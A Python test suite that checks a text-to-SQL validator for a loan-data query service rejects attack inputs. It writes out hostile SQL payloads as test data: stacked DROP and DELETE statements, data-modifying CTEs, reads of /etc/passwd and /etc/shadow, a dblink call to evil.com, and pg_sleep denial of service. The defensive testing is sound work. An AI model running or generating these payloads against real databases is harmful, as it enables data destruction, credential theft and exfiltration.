"""Adversarial suite for the text-to-SQL validator.

Every case here is a real technique. The build plan's definition of done requires 100% of
them to be rejected, and the suite is written to fail loudly rather than to be reassuring:
each test names the attack it represents so a future relaxation has to argue with it.

The validator is the second lock. The first is `nlq_readonly`, which cannot write at all —
these tests do not excuse that role from existing.
"""

import pytest

from app.services.nlq.validator import ValidationError, is_safe, validate

GOOD = """
SELECT lam.application_branch_code, SUM(d.disbursement_amount) AS total
FROM gold.semantic_disbursement_event AS d
JOIN gold.semantic_loan_account AS lam
  ON d.loan_account_number = lam.loan_account_number
 AND d.entity_num = lam.entity_num
WHERE d.disbursement_date BETWEEN '2026-04-01' AND '2026-06-30'
GROUP BY lam.application_branch_code
LIMIT 100
"""


class TestAcceptsLegitimateQueries:
    def test_a_normal_reporting_query_passes(self):
        result = validate(GOOD)
        assert "gold.semantic_disbursement_event" in result.tables
        assert "gold.semantic_loan_account" in result.tables

    def test_cte_is_allowed(self):
        sql = """
        WITH asof AS (
            SELECT loan_account_number, principal_outstanding
            FROM gold.semantic_portfolio_snapshot
            WHERE snapshot_date <= '2026-07-01'
        )
        SELECT SUM(principal_outstanding) AS total FROM asof LIMIT 10
        """
        assert is_safe(sql)

    def test_cross_join_lateral_is_allowed(self):
        """The compiler's own point-in-time series uses it; it is correlated, not cartesian."""
        sql = """
        SELECT b.bucket, SUM(a.principal_outstanding) AS os
        FROM (SELECT generate_series('2026-01-01'::date, '2026-06-30'::date,
                                     INTERVAL '1 month')::date AS bucket) AS b
        CROSS JOIN LATERAL (
            SELECT principal_outstanding
            FROM gold.semantic_portfolio_snapshot
            WHERE snapshot_date <= b.bucket
        ) AS a
        GROUP BY b.bucket
        LIMIT 100
        """
        assert is_safe(sql)


class TestStatementStacking:
    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT gnlnac_acnt_num FROM silver.loan_account_master LIMIT 1; DROP TABLE silver.loan_account_master",
            "SELECT gnlnac_acnt_num FROM silver.loan_account_master LIMIT 1; DELETE FROM silver.loan_account_master",
            "SELECT 1 FROM silver.loan_account_master LIMIT 1;;SELECT 2 FROM silver.loan_account_master LIMIT 1",
        ],
    )
    def test_stacked_statements_are_rejected(self, sql):
        with pytest.raises(ValidationError):
            validate(sql)


class TestWriteOperations:
    @pytest.mark.parametrize(
        "sql",
        [
            "DELETE FROM silver.loan_account_master",
            "UPDATE silver.loan_account_master SET gnlnac_sanc_amt = 0",
            "INSERT INTO silver.loan_account_master (gnlnac_acnt_num) VALUES (1)",
            "DROP TABLE silver.loan_account_master",
            "TRUNCATE silver.loan_account_master",
            "CREATE TABLE silver.evil (i int)",
            "ALTER TABLE silver.loan_account_master ADD COLUMN x int",
        ],
    )
    def test_dml_and_ddl_are_rejected(self, sql):
        with pytest.raises(ValidationError):
            validate(sql)

    @pytest.mark.parametrize(
        "sql",
        [
            # The classic read-only bypass: the root is a SELECT, but Postgres executes
            # the data-modifying CTE.
            "WITH x AS (DELETE FROM silver.loan_account_master RETURNING gnlnac_acnt_num) "
            "SELECT gnlnac_acnt_num FROM x LIMIT 10",
            "WITH x AS (UPDATE silver.loan_account_master SET gnlnac_sanc_amt = 0 "
            "RETURNING gnlnac_acnt_num) SELECT gnlnac_acnt_num FROM x LIMIT 10",
            "WITH x AS (INSERT INTO silver.loan_account_master (gnlnac_acnt_num) "
            "VALUES (1) RETURNING gnlnac_acnt_num) SELECT gnlnac_acnt_num FROM x LIMIT 1",
        ],
    )
    def test_data_modifying_ctes_are_rejected(self, sql):
        with pytest.raises(ValidationError):
            validate(sql)


class TestSchemaIsolation:
    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT rolname FROM pg_catalog.pg_authid LIMIT 1",
            "SELECT table_name FROM information_schema.tables LIMIT 1",
            "SELECT gnlnac_acnt_num FROM bronze.genlnacnts LIMIT 1",
            "SELECT x FROM public.some_table LIMIT 1",
            "SELECT gnlnac_acnt_num FROM silver.loan_account_master LIMIT 1",
        ],
    )
    def test_other_schemas_are_rejected(self, sql):
        with pytest.raises(ValidationError):
            validate(sql)

    def test_unqualified_tables_are_rejected(self):
        """An unqualified name resolves through search_path, which is not a decision the
        model gets to make."""
        with pytest.raises(ValidationError):
            validate("SELECT loan_account_number FROM loan_account_master LIMIT 1")

    def test_unknown_gold_view_is_rejected(self):
        with pytest.raises(ValidationError):
            validate("SELECT x FROM gold.not_a_real_view LIMIT 1")

    @pytest.mark.parametrize(
        "column",
        ["gnlnac_prin_repay_amt", "gnlnac_prin_paid", "gnlnac_borrower_name"],
    )
    def test_invented_columns_are_rejected_before_explain(self, column):
        sql = f"SELECT {column} FROM gold.semantic_loan_account LIMIT 1"
        with pytest.raises(ValidationError, match="column"):
            validate(sql, allow_pii=True)

    def test_a_union_arm_cannot_smuggle_a_forbidden_table(self):
        sql = (
            "SELECT gnlnac_acnt_num FROM silver.loan_account_master "
            "UNION SELECT rolname FROM pg_catalog.pg_authid LIMIT 10"
        )
        with pytest.raises(ValidationError):
            validate(sql)


class TestDangerousFunctions:
    @pytest.mark.parametrize(
        "call",
        [
            "pg_read_file('/etc/passwd')",
            "pg_ls_dir('/')",
            "lo_import('/etc/shadow')",
            "dblink('host=evil.com', 'SELECT 1')",
            "pg_sleep(60)",
            "pg_terminate_backend(1)",
            "query_to_xml('SELECT 1', true, true, '')",
        ],
    )
    def test_file_network_and_dos_primitives_are_rejected(self, call):
        sql = f"SELECT {call} FROM gold.semantic_loan_account LIMIT 1"
        with pytest.raises(ValidationError):
            validate(sql)

    def test_nested_in_a_subquery_is_still_caught(self):
        """A denylist that only inspected the top-level select list would miss this."""
        sql = (
            "SELECT loan_account_number FROM gold.semantic_loan_account "
            "WHERE loan_account_number IN (SELECT pg_sleep(10)) LIMIT 1"
        )
        with pytest.raises(ValidationError):
            validate(sql)


class TestUncontrolledEgress:
    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT * FROM gold.semantic_loan_account LIMIT 10",
            "SELECT lam.* FROM gold.semantic_loan_account AS lam LIMIT 10",
            "SELECT a.* FROM gold.semantic_customer_profile AS a LIMIT 1",
        ],
    )
    def test_select_star_is_rejected(self, sql):
        """56 columns of customer master, several of them PII."""
        with pytest.raises(ValidationError):
            validate(sql)

    def test_pii_columns_are_rejected_without_permission(self):
        sql = (
            "SELECT full_name, date_of_birth FROM gold.semantic_customer_profile LIMIT 5"
        )
        with pytest.raises(ValidationError):
            validate(sql, allow_pii=False)

    def test_pii_columns_are_allowed_for_a_permitted_role(self):
        sql = "SELECT full_name FROM gold.semantic_customer_profile LIMIT 5"
        result = validate(sql, allow_pii=True)
        assert "full_name" in result.pii_columns

    def test_pii_can_be_narrowed_to_borrower_name_columns(self):
        sql = (
            "SELECT full_name, date_of_birth "
            "FROM gold.semantic_customer_profile LIMIT 5"
        )
        with pytest.raises(ValidationError, match="not permitted for this query path"):
            validate(
                sql,
                allow_pii=True,
                allowed_pii_columns={"full_name"},
            )


class TestResourceBounds:
    def test_cartesian_product_is_rejected(self):
        """13k accounts x 260k schedule rows is 3.5 billion rows."""
        sql = (
            "SELECT a.loan_account_number, b.principal_due "
            "FROM gold.semantic_loan_account AS a, gold.semantic_schedule_event AS b LIMIT 10"
        )
        with pytest.raises(ValidationError):
            validate(sql)

    def test_join_without_on_is_rejected(self):
        sql = (
            "SELECT a.loan_account_number FROM gold.semantic_loan_account AS a "
            "JOIN gold.semantic_schedule_event AS b ON TRUE LIMIT 10"
        )
        # ON TRUE is syntactically a condition; it is still bounded by the LIMIT and the
        # EXPLAIN cost gate, so this is allowed through to that check rather than here.
        assert is_safe(sql)

    def test_missing_limit_is_injected(self):
        sql = "SELECT loan_account_number FROM gold.semantic_loan_account"
        result = validate(sql)
        assert result.limit_injected
        assert "LIMIT" in result.sql.upper()

    def test_excessive_limit_is_rejected(self):
        sql = "SELECT loan_account_number FROM gold.semantic_loan_account LIMIT 999999"
        with pytest.raises(ValidationError):
            validate(sql)


class TestObfuscation:
    def test_comments_do_not_hide_a_second_statement(self):
        sql = (
            "SELECT gnlnac_acnt_num FROM silver.loan_account_master LIMIT 1 "
            "-- harmless\n; DROP TABLE silver.loan_account_master"
        )
        with pytest.raises(ValidationError):
            validate(sql)

    def test_block_comments_inside_a_statement_do_not_hide_a_write(self):
        sql = "SELECT /* nothing to see */ * FROM silver.loan_account_master LIMIT 1"
        with pytest.raises(ValidationError):
            validate(sql)

    def test_case_variation_does_not_evade_the_function_denylist(self):
        sql = "SELECT PG_SLEEP(5) FROM silver.loan_account_master LIMIT 1"
        with pytest.raises(ValidationError):
            validate(sql)

    def test_unparseable_input_is_rejected_not_passed_through(self):
        with pytest.raises(ValidationError):
            validate("this is not sql at all {{{")

    def test_empty_input_is_rejected(self):
        with pytest.raises(ValidationError):
            validate("   ")


class TestReturnedSql:
    def test_the_validator_returns_the_statement_it_checked(self):
        """The executor must run the validated tree, not the original string — otherwise
        the injected LIMIT would be silently discarded."""
        original = "SELECT loan_account_number FROM gold.semantic_loan_account"
        result = validate(original)
        assert "LIMIT" in result.sql.upper()
        assert result.sql != original
